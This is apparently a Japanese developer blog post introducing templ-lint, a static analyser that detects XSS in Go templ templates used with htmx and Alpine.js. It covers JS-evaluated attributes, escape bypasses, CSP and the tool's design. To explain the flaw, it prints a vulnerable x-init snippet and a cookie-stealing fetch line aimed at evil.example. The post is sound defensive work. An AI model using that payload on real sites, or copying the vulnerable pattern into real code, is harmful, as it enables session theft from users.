# エスケープしても防げないXSSがある ― templ + htmx/Alpine.js のための静的解析ツール templ-lint を作った

Go の [a-h/templ](https://github.com/a-h/templ) で HTML を書き、htmx や Alpine.js でインタラクションを足す。SPA を避けてサーバ駆動に寄せる、最近よく見る構成だ。この構成には、**既存の静的解析ツールがまったく検知しない XSS のクラス**が潜んでいる。それを埋めるために [templ-lint](https://github.com/taq25/templ-lint) を作って公開した。この記事は、その「なぜ」と「どう作ったか」の記録である。

## エスケープされているのに XSS になる

まず、次のコードを見てほしい。

```html
<div x-init={ userInput }>...</div>
```

templ はすべての属性値を HTML エスケープする。だから `userInput` に `"><script>` のような値が来ても、素直な意味での「タグの注入」は起きない。**それでもこれは XSS になる。**

理由は Alpine.js の仕様にある。Alpine は `x-init` や `@click`、htmx なら `hx-on:*` といった属性の**値そのものを JavaScript として評価**する。HTML エスケープが防ぐのは「値が属性の外へ脱出すること」だが、これらの属性では値が脱出する必要がない ―― **値がそのままコードとして実行される**からだ。`fetch('https://evil.example/?c='+document.cookie)` という文字列は、エスケープしても `fetch(...)` のままで、そのまま動く。

これは Alpine/htmx に限らない。素の HTML の `onclick` / `onerror` も同じ construct だ。「属性値が JS として評価される」系統は、エスケープという防御が構造的に効かない。

## なぜ既存ツールがこれを見逃すのか

「じゃあ golangci-lint や gosec が警告してくれるのでは?」と思うだろう。しないのだ。

- **golangci-lint / gosec** は、templ が `.templ` から生成する `*_templ.go` を「生成コード」として**慣習的にスキャン対象から外す**。しかも templ のセマンティクス(どの属性が危険か)を知らない。
- **templ 本体の LSP** は構文チェックとフォーマットが仕事で、この種のセキュリティ規則は持たない。
- **DAST(OWASP ZAP など)** も、ペイロードがエスケープされて反射されるため、この「属性内で JS が発火する」タイプの検出は苦手だ。

調べた範囲では、`.templ` を対象にこのクラスを検知する公開ツールは存在しなかった。OSS の空白地帯だったので、自分で埋めることにした。

## 設計の肝: 生成された `.go` ではなく `.templ` を解析する

最初に迷ったのが「**何を解析対象にするか**」だった。直感的には「実際に動くのは生成された `.go` なんだから、それを見る方が確実では?」と思える。実際に両方を試して比較した。

7 行の `.templ` は生成後に 74 行の `.go` になる。その中で危険な `x-init={ userInput }` はこう分解される:

```go
// 属性名は「文字列リテラルの末尾」として出る
WriteString(buffer, 1, "<div x-init=\"")
// ...間に別のコード...
// 動的な値は別の文へ切り離される
templ_Var2, err = templ.ResolveAttributeValue(userInput)
```

ここが決定的だった。`.templ` では「`x-init` という属性が `userInput` という動的値を持つ」が**1 つの意味のまとまり**なのに、生成コードでは**属性名が文字列の断片・値が別の文へとバラバラに解体**される。生成コード側で検知するには「文字列が `attr="` で終わっていたら次に動的値が来る」という**templ のコード生成フォーマットを逆算するヒューリスティック**を書くしかない。

そしてこの方式には最悪の弱点がある。templ がバージョンアップで生成フォーマットを変えたら、ヒューリスティックは**何も報告せず静かに素通り**する。エラーにならないので、壊れたことに気づけない ―― セキュリティツールとして最も避けたい故障モードだ。

一方 `.templ` を templ 公式の `parser/v2` で直接パースすると、`ExpressionAttribute{Key: "x-init", Expression: "userInput"}` という**型付きのノード**が得られる。静的な値(`ConstantAttribute`)と動的な値(`ExpressionAttribute`)が型レベルで区別済みで、意味のまとまりが保たれている。しかも templ 本体のパーサにリンクしているので、templ の AST が変われば**コンパイルエラーとして即座に顕在化**する。「静かな偽陰性」が起きない。

だから templ-lint は `.templ` を主戦場にした。「動くコードに近い」ことは「検知しやすい」を意味しない、というのがこの検証の教訓だ。

## 二段パーサ: templ で構造を、go/parser で式を

`.templ` の中には Go の式も埋め込まれている(`@templ.Raw(x)` など)。templ の `parser/v2` はこれを**位置付きの文字列**として保持しているので、templ-lint はそれを標準の `go/parser` に渡し、**正規の Go AST として解析**する。

つまり「templ のパーサで HTML 構造を、go/parser で埋め込み Go 式を」という二段構え。どちらの言語も自前でパースせず、公式パーサ 2 つを Visitor とクロージャで束ねているだけだ。だからコード量が薄い割に精度が出る。

## 何を検知するか

ルールは severity で 2 段階。ERROR は「ほぼ確実に脆弱」、WARNING は「原則直すべきだが判断の余地あり」。

**ERROR ― XSS の主防御**

- `js-eval-attr` ―― JS として評価される属性(HTML `on*`、Alpine `x-*`/`@*`/`:*`、htmx `hx-on:*`/`hx-vals`/`hx-headers`)への動的値。冒頭の例そのもの。
- `escape-bypass` ―― `templ.Raw` / `templ.SafeURL` 等への非リテラル引数。エスケープを完全にバイパスするので、変数を渡せば XSS 直行。
- `dyn-attr-name` ―― 属性「名」が動的(`{ name }={ value }`)。名前を攻撃者が選べると、値をどうサニタイズしても防げない。

**WARNING ― 要注意パターンと、XSS 以外の脆弱性**

- `url-attr` ―― 動的な `hx-get` 等のリクエスト先。
- `spread-attr` ―― `{ attrs... }` は名前も値も実行時次第。
- `unsafe-target-blank` ―― `target="_blank"` に `rel="noopener"` がない([reverse tabnabbing](https://cwe.mitre.org/data/definitions/1022.html))。開いた先が `window.opener` 経由で元タブを偽ログイン画面に書き換えられる。
- `missing-sri` ―― クロスオリジンの `<script>`/`<link>` に `integrity` がない(サプライチェーンリスク)。CDN が侵害されると全ユーザーが悪意あるコードを実行させられる。

XSS だけでなく、「HTML の書き方そのものが作る攻撃の入り口」まで広げた。逆に、SQL インジェクションや認証などハンドラ側ロジックの脆弱性は `.templ` から見えないので、はっきり対象外にしている。

## サニタイズは「形」で許可する

`templ.Raw` は「すでに HTML である文字列」を出力する正当な用途がある(Markdown レンダリング結果など)。全面禁止では不便だ。そこで例外を設けた:

```go
// NG: 変数をそのまま渡す
@templ.Raw(userHTML)

// OK: bluemonday のサニタイズチェーン(常に許可)
@templ.Raw(bluemonday.UGCPolicy().Sanitize(userHTML))

// OK: -allow-sanitizer sanitize.HTML で登録したラッパー
@templ.Raw(sanitize.HTML(userHTML))
```

ポイントは、templ-lint が検証するのは**「形」だけ**ということ。`sanitize.HTML(x)` という形は許可するが、その中身が本当に安全かは保証しない。だから「bluemonday ポリシーを 1 ファイルに集約したラッパー」を推奨し、コンパイル・テスト済みの[参照実装](https://github.com/taq25/templ-lint/tree/main/examples/sanitize)を同梱した。安全性の担保は、その 1 ファイルのレビューとテストに集約される。

なお、変数に格納したポリシー経由(`p.Sanitize(x)`)は許可しない。AST では `p` が本当に bluemonday かを検証できず、「`Sanitize` という名前のメソッドなら何でも通る」抜け穴になるからだ。

## 誤検知には「理由付き」で黙らせる

taint 追跡をしない設計上、安全なコードも検知することがある(値の出所が `.templ` からは見えないため)。そこで抑制コメントを用意したが、**理由の記述を必須**にした:

```html
<!-- templ-lint:ignore js-eval-attr preset はサーバ側 enum で、ユーザー入力ではない -->
<div x-init={ preset }>
```

理由を書かない抑制は、効果を持たないうえに `invalid-ignore` として警告される。理由なしの抑制は放っておくと腐り、「なぜ安全なのか」を後から誰も検証できなくなるからだ。理由を強制すると、レビューの問いが「このコードは安全か?」から「書かれた理由は真か?」という検証可能なものに変わる。

## 完全なサニタイズがあれば CSP は要らないのか

開発中によく議論になった論点なので書いておく。答えは「理論上はそうだが、実務では無理」だ。

CSP は予防策ではなく「予防が破れたときの被害軽減策」だから、予防(静的解析+サニタイズ)が本当に完璧なら論理的には不要になる。だが「完璧なサニタイズ」は、サニタイザ自身のバグ(mutation XSS など)やコンテキスト取り違えのせいで到達不能な理想だ。しかもサニタイズは tabnabbing や CDN 侵害のような**別カテゴリの攻撃**には無力だ。

だから多層で守る。とはいえ「CSP を入れると Alpine の良さが消える」も事実で、Alpine 標準ビルドは `unsafe-eval` を要求する。ここで重要なのは、**`unsafe-eval` 付きの CSP も価値ゼロではない**こと:

```
Content-Security-Policy:
  script-src 'self' 'nonce-{ランダム}' 'unsafe-eval';
  object-src 'none';
  base-uri 'self';
```

`unsafe-eval` が開けるのは eval の穴だけで、nonce ベースの `script-src` は生きている。つまり**攻撃者が注入したスクリプトタグは依然ブロックできる**。標準 Alpine の DX を保ったまま、CSP の実利の大半を得られる。残る eval 経由の穴を templ-lint とサニタイズが埋める、という分担になる。

## 使い方

```bash
go install github.com/taq25/templ-lint@latest

# ./views 以下の *.templ を再帰的に検査
templ-lint -allow-sanitizer sanitize.HTML ./views

# JSON 出力 / WARNING も失敗扱い
templ-lint -format json -strict ./views
```

CI では tag を固定して使う(新ルールは既存 CI を新たに落としうるため):

```yaml
- run: go run github.com/taq25/templ-lint@v0.2.0 -allow-sanitizer sanitize.HTML ./views
```

指摘は生成コードではなく `.templ` の行・列を直接指すので、そのままエディタで開いて直せる。

## 正直な限界

- 検査対象は `.templ` のみ。手書きの `.go` に書いた `templ.Raw` は見えない(必要なら Go 側のリンタと併用する)。
- taint 追跡はしないので、非リテラルは許可リスト外なら一律検知(安全側の誤検知)。
- 静的解析は実行時の値を見られない。CSP・Alpine CSP ビルド・SRI といったランタイム対策と併用してこそ意味がある。

## おわりに

templ + htmx/Alpine は良い構成だが、「エスケープしているから安全」という直感が通用しない一角がある。templ-lint はそこに絞った小さなツールで、`.templ` を公式パーサで直接読むことで、生成コードのフォーマットに依存しない確実な検知を実現した。

リポジトリはこちら: **https://github.com/taq25/templ-lint**

同じ構成で開発している人の役に立てば嬉しい。フィードバックや「こんな危険パターンも見てほしい」という要望は Issue へ。
